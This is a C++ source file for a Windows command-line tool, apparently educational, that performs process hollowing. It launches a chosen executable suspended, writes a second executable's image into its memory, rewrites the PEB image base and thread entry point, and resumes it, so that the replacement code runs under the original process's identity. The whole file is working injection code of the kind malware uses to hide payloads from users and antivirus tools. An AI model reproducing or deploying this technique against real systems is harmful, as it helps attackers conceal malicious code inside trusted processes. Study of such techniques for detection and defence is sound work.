#include <windows.h>
#include <stdio.h>
#include <winternl.h>
#include <Psapi.h>
#include <ImageHlp.h>
#include <assert.h>

#pragma comment(lib, "imagehlp")
#pragma comment(lib, "ntdll")


PROCESS_INFORMATION pi;

int Error(const char* text) {
	printf("%s (%u)\n", text, GetLastError());
	if (pi.hProcess) {
		TerminateProcess(
			pi.hProcess,   // hProcess: Handle to the process to be terminated.
			0              // uExitCode: Exit code for the terminated process; 0 usually indicates a successful termination.
		);
	}
	return 1;
}

int main(int argc, char* argv[]) {
	if (argc < 3) {
		printf("usage: Hollow <image_name> <replacement_exe>\n"); // image_name is the hollowed process
		return 0;
	}

	auto name = argv[1];     // process that we want to create
	auto replace = argv[2];  // replace the hollowed process with this

	STARTUPINFOA si = { sizeof(si) }; // required to windows API, look for correct size and not beyond that
	if (!CreateProcessA(
		nullptr,            // lpApplicationName: The name of the module to be executed (null for command line).
		name,               // lpCommandLine: The command line to be executed (contains executable name and parameters).
		nullptr,            // lpProcessAttributes: A pointer to a SECURITY_ATTRIBUTES structure for the process's security attributes (null for default).
		nullptr,            // lpThreadAttributes: A pointer to a SECURITY_ATTRIBUTES structure for the thread's security attributes (null for default).
		FALSE,              // bInheritHandles: Specifies whether to inherit handles (FALSE means handles are not inherited).
		CREATE_SUSPENDED,   // dwCreationFlags: Creation options (CREATE_SUSPENDED starts the process in a suspended state).
		nullptr,            // lpEnvironment: A pointer to the new environment block (null for the parent’s environment).
		nullptr,            // lpCurrentDirectory: The current directory for the process (null for the current directory of the calling process).
		&si,                // lpStartupInfo: A pointer to a STARTUPINFO structure that contains startup information (will be filled with process startup info).
		&pi                 // lpProcessInformation: A pointer to a PROCESS_INFORMATION structure that receives identification information about the newly created process (will be filled with process ID and handle).
	)) {
		return Error("failed to create process");
	}

	printf("created PID: %u\n", pi.dwProcessId);

	// set current directory to where our EXE is
	WCHAR path[MAX_PATH];
	GetModuleFileName(
		nullptr,                // hModule: Handle to the module; nullptr indicates the current process's executable.
		path,                   // lpFilename: Pointer to a buffer that receives the full path of the executable module.
		_countof(path)          // nSize: Size of the buffer in characters; specifies how many characters can be written to `path`.
	);
	*wcsrchr(path, L'\\') = 0;
	SetCurrentDirectory(path);  // lpPathName: Pointer to a null-terminated string that specifies the path to the new current directory

	// open EXE file that we want to replace
	HANDLE hFile = CreateFileA(
		replace,                            // lpFileName: The name of the file to be created or opened.
		GENERIC_READ,                       // dwDesiredAccess: The access level; GENERIC_READ opens the file for reading.
		FILE_SHARE_READ | FILE_SHARE_WRITE, // dwShareMode: Specifies how the file can be shared; allows concurrent reading/writing.
		nullptr,                            // lpSecurityAttributes: A pointer to a SECURITY_ATTRIBUTES structure (null for default).
		OPEN_EXISTING,                      // dwCreationDisposition: Specifies how to open the file; OPEN_EXISTING opens the file only if it exists.
		0,                                  // dwFlagsAndAttributes: File attributes and flags (0 means default attributes).
		nullptr                             // hTemplateFile: A handle to a template file (null means no template is used).
	);
	if (hFile == INVALID_HANDLE_VALUE) {
		return Error("failed to open file");
	}

	// allocate memory in the suspended process because we want to map some code into that from the EXE file, but potential redflag for antiviruses
	PVOID newAddress = VirtualAllocEx(
		pi.hProcess,                             // hProcess: Handle to the process in which memory will be allocated.
		nullptr,                                 // lpAddress: Desired starting address for the allocation; null will allow the OS to choose the address.
		GetFileSize(hFile, nullptr) + (1 << 16), // dwSize: Size of the memory region to allocate; size of the file plus 64KB for extra space.
		MEM_COMMIT | MEM_RESERVE,                // flAllocationType: Specifies the type of memory allocation; both commits and reserves memory.
		PAGE_EXECUTE_READWRITE                   // flProtect: Memory protection options; allows read, write, and execute permissions.
	);
	if (!newAddress) {
		return Error("failed to allocate memory");
	}

	printf("address in target process: 0x%p\n", newAddress);

	ULONG orgSize, newSize;
	ULONG64 oldImageBase, newImageBase = (ULONG64)newAddress;

	// rebase replace image to newAdress address
	if (!ReBaseImage64(
		replace,             // pImageBase: The address of the image base to be relocated.
		nullptr,             // pImageEnd: Pointer to the end of the image; null if the end is unknown.
		TRUE,                // fRebase: Indicates whether to perform the actual rebasing (TRUE means it will rebase).
		FALSE,               // fOffsets: Specifies if offsets should be considered during rebasing (FALSE for no offsets).
		FALSE,               // fRelocations: Indicates whether relocation entries should be processed (FALSE means it won't).
		0,                   // Reserved: A reserved parameter (typically set to 0).
		&orgSize,            // pOrgSize: Pointer to a variable that receives the original size of the image.
		&oldImageBase,       // pOldBase: Pointer to a variable for the current base address before rebasing.
		&newSize,            // pNewSize: Pointer to a variable that receives the new size of the image after rebasing.
		&newImageBase,       // pNewBase: Pointer to a variable that receives the new base address after rebasing.
		0                    // Reserved: Another reserved parameter (typically set to 0).
	)) {
		return Error("failed to rebase image");
	}

	// map replace EXE to an address space
	HANDLE hMemFile = CreateFileMapping(
		hFile,               // hFile: Handle to the file for which to create the file mapping.
		nullptr,             // lpFileMappingAttributes: A pointer to a SECURITY_ATTRIBUTES structure (null for default).
		PAGE_READONLY,       // flProtect: Protection for the mapping; PAGE_READONLY indicates the mapping is read-only.
		0,                   // dwMaximumSizeHigh: The high-order part of the maximum size of the mapping (0 for default).
		0,                   // dwMaximumSizeLow: The low-order part of the maximum size of the mapping (0 means the mapping will be the size of the file).
		nullptr              // lpName: An optional name for the mapping object (null means no name).
	);
	if (!hMemFile) {
		return Error("failed to create MMF");
	}

	CloseHandle(hFile);     // hObject: Handle to an open object (e.g., file, process, thread) that you want to close.

	// map the file in same address that is mapped to the target process
	PVOID address = MapViewOfFileEx(
		hMemFile,           // hFileMappingObject: Handle to the file mapping object to map into the address space.
		FILE_MAP_READ,      // dwDesiredAccess: Access level for the view; FILE_MAP_READ allows read-only access to the memory.
		0,                  // dwFileOffsetHigh: High-order part of the offset where mapping starts (0 for default).
		0,                  // dwFileOffsetLow: Low-order part of the offset where mapping starts (0 means start from the beginning).
		0,                  // dwNumberOfBytesToMap: Number of bytes to map; 0 means map the entire file.
		newAddress          // lpBaseAddress: The desired starting address for the mapped view; can be null to allow the system to choose.
	);
	if (!address) {
		return Error("failed to map in requested address");
	}

	// PE parsing
	auto dosHeader = (PIMAGE_DOS_HEADER)address;                           // The address the EXE is mapped to, cast to IMAGE_DOS_HEADER structure.
	auto nt = (PIMAGE_NT_HEADERS)((BYTE*)address + dosHeader->e_lfanew);   // Retrieve the NT header by calculating the offset from the DOS header.
	auto sections = (PIMAGE_SECTION_HEADER)(nt + 1);                       // Access the section headers, which follow the NT headers.

	SIZE_T written;

	//copy header
	WriteProcessMemory(
		pi.hProcess,                             // hProcess: Handle to the target process where memory will be written.
		(PVOID)newAddress,                       // lpBaseAddress: Address in the target process where the data will be written.
		(PVOID)nt->OptionalHeader.ImageBase,     // lpBuffer: Pointer to the data that will be written; typically the base address of the image.
		nt->OptionalHeader.SizeOfHeaders,        // dwSize: Number of bytes to write; here, the size of the headers from the optional header.
		&written                                 // lpNumberOfBytesWritten: Pointer to a variable that receives the number of bytes actually written.
	);

	// copy sections
	for (ULONG i = 0; i < nt->FileHeader.NumberOfSections; i++) {
		WriteProcessMemory(
			pi.hProcess,                                           // hProcess: Handle to the target process where memory will be written.
			PVOID((PBYTE)newAddress + sections[i].VirtualAddress), // lpBaseAddress: Address in the target process where the data will be written; calculated by adding VirtualAddress to newAddress.
			PVOID(sections[i].PointerToRawData + nt->OptionalHeader.ImageBase), // lpBuffer: Pointer to the data to be written; points to the raw data of the section.
			sections[i].SizeOfRawData,                             // dwSize: Number of bytes to write; corresponds to the size of the section's raw data.
			&written                                               // lpNumberOfBytesWritten: Pointer to a variable to receive the number of bytes actually written.
		);
	}

	// get PEB of target
	PROCESS_BASIC_INFORMATION pbi{};
	// to get the pointer of where PEB is 
	NtQueryInformationProcess(
		pi.hProcess,                 // ProcessHandle: Handle to the process whose information is being queried.
		ProcessBasicInformation,     // ProcessInformationClass: Specifies the type of information to retrieve; here, it requests basic information about the process.
		&pbi,                        // ProcessInformation: Pointer to a buffer that receives the requested information; this holds the process basic information structure.
		sizeof(pbi),                 // ProcessInformationLength: Size of the buffer, indicating how much data can be held by `pbi`.
		nullptr                      // ReturnLength: Pointer to a variable that receives the size of the data returned; here, set to null as it's not needed.
	);
	PVOID peb = pbi.PebBaseAddress; // address of target PEB

	// update PEB with new image base
	WriteProcessMemory(
		pi.hProcess,                                // hProcess: Handle to the target process where memory will be written.
		(LPVOID)((PBYTE)peb + sizeof(PVOID) * 2),   // lpBaseAddress: Target address in the process's memory, calculated by offsetting the PEB pointer.
		&nt->OptionalHeader.ImageBase,              // lpBuffer: Pointer to the data to be written; here it points to the image base of the new executable.
		sizeof(PVOID),                              // dwSize: Size of the data to write; here, the size of a pointer.
		&written                                    // lpNumberOfBytesWritten: Pointer to a variable to hold the number of bytes actually written.
	);

	CONTEXT context{};
	context.ContextFlags = CONTEXT_INTEGER;
	GetThreadContext(
		pi.hThread,   // hThread: Handle to the thread whose context is being retrieved.
		&context      // lpContext: Pointer to a CONTEXT structure that receives the thread's context information.
	);

#ifdef _WIN64
	// for x64, RCX points to the next instruction
	context.Rcx = (DWORD64)(nt->OptionalHeader.AddressOfEntryPoint + (DWORD64)newAddress); // Set the entry point of the mapped EXE to the RCX register
#else
	// for x86, EBX points to the next instruction
	context.Ebx = (DWORD)(nt->OptionalHeader.AddressOfEntryPoint + (DWORD)newAddress); // Set the entry point of the mapped EXE to the EBX register
#endif

	// set thread with the new value
	SetThreadContext(
		pi.hThread,    // hThread: Handle to the thread whose context is being set.
		&context       // lpContext: Pointer to a CONTEXT structure that contains the new context information to be applied to the thread.
	);

	UnmapViewOfFile(address);    // lpBaseAddress: Pointer to the base address of the mapped view to unmap.
	ResumeThread(pi.hThread);    // hThread: Handle to the thread that is to be resumed.
	CloseHandle(pi.hThread);     // hObject: Handle to the thread to be closed.
	CloseHandle(pi.hProcess);    // hObject: Handle to the process to be closed.

	return 0;
}